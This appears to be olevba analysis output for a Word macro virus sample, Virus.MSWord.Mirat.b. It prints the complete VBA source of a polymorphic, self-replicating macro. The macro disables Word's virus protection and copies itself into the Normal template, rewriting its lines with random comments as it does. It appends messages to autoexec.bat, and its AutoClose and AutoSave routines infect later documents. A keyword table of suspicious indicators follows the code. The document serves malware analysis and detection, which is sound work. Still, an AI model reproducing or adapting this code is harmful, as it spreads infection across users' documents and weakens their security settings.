olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mirat.b-cea974b7c943e222894d1789624a5895dbdfe3ed
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mirat.b-cea974b7c943e222894d1789624a5895dbdfe3ed - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO fUY.bas 
in file: Virus.MSWord.Mirat.b-cea974b7c943e222894d1789624a5895dbdfe3ed - OLE stream: 'Macros/VBA/fUY'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen() 'BD|!
'PolyMorphing Viruz by MI_pirat '{Ѓu%
'CodeNAME: Kewl--NOT! 'Q‡~L
On Error Resume Next '“€&‘
StatusBar = "<< Kewl lives somewhere in HERE >>" 'K^|&
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Kewl") <> "Kaka" Then 'gXCj
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Kewl") = "Kaka" 'm?Aѓ
Options.VirusProtection = (2 Xor 2) '‚f–Ќ
Dim nr, xxx, nume ';s•=
nume = Chr(Int((100 * Rnd) + 32)) + Chr(Int((100 * Rnd) + 32)) + Chr(Int((100 * Rnd) + 32)) '`,—q
ActiveDocument.VBProject.VBComponents(2).Name = nume '!e,,
nr = ActiveDocument.VBProject.VBComponents.Item(2).CodeModule.CountOfLines 'B%C
Set myTemplate = NormalTemplate 'MD‘•
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=myTemplate.FullName, Name:=nume, Object:=wdOrganizerObjectProjectItems 'PA33
For i = 1 To nr 'mQQu
xxx = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(i, 1) 'Gk86
poly = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) 'f)VЊ
strn = xxx + " '" + poly '?~MB
NormalTemplate.VBProject.VBComponents.Item(2).CodeModule.ReplaceLine i, strn 'ЋkkS
Next i '+csЌ
Documents.Open FileName:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", Format:=wdOpenFormatAuto '„"aЌ
ActiveDocument.Save 'Sq\]
ActiveDocument.Close 'WJP@
'Some publicity doesn't hurt anyone '&=•'
Open "C:\autoexec.bat" For Append As #1 'NKZ2
Print #1, "@echo off" 'X>ka
Print #1, "echo MI_pirat" '2ђn\
Print #1, "echo Kewl LiVeS SoMeWhErE In YoUr SyStEm ---- ENDjoy" 'N,~W
Print #1, "echo." 'zgѓ"
Close #1 '9(,G
End If '/ `n
End Sub 'aѓ)7
Sub AutoClose() 'qVJ1
'Errr.. spead me 'tЏ_*
On Error Resume Next 'zPW[
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") + 1 '8G+f
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") >= 10 Then MsgBox "Are U havn' phun ?", vbYesNo, "Kewl has spead considerably !" '4Џ+U
Dim nume, myTemplate '@€z@
myTemplate = NormalTemplate 'p>*#
nume = NormalTemplate.VBProject.VBComponents(2).Name 'F~C<
For Each aVar In ActiveDocument.Variables 'Y>H%
    If aVar.Name = "Inf" Then num = aVar.Index 'Y8‡f
Next aVar 'zЏGa
If (num = 0) And (ActiveDocument.FullName <> myTemplate.FullName) Then ')lQ“
ActiveDocument.Variables.Add Name:="Inf" '-ЋjI
ActiveDocument.Variables("Inf").Value = 1 '1Y:—
Set myTemplate = ActiveDocument.AttachedTemplate '/#Ia
Application.OrganizerCopy Source:=myTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=nume, Object:=wdOrganizerObjectProjectItems 'Ћ`P…
ActiveDocument.Save 'ѓpv—
End If 'H[Qs
End Sub '5RaЃ
Sub AutoSave() '`S];
'Sure...Hehe infect it everytime 'jZqЉ
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") + 1 'LDC2
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") >= 10 Then MsgBox "Are U havn' phun ?", vbYesNo, "Kewl has spead considerably !" '_:fK
On Error Resume Next '‰Y6r
Dim nume, myTemplate 'yi}3
myTemplate = NormalTemplate 'Ђ8’'
nume = NormalTemplate.VBProject.VBComponents(2).Name ''MW
For Each aVar In ActiveDocument.Variables '.-4%
    If aVar.Name = "Inf" Then num = aVar.Index 'u_c:
Next aVar 'XyzO
If (num = 0) And (ActiveDocument.FullName <> myTemplate.FullName) Then 'Њy*l
ActiveDocument.Variables.Add Name:="Inf" 'u!SP
ActiveDocument.Variables("Inf").Value = 1 'A–Ђs
Set myTemplate = ActiveDocument.AttachedTemplate 'RxAJ
Application.OrganizerCopy Source:=myTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=nume, Object:=wdOrganizerObjectProjectItems 'T‘.m
ActiveDocument.Save 'I,6)
End If 'S“a[
End Sub '”:MO
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

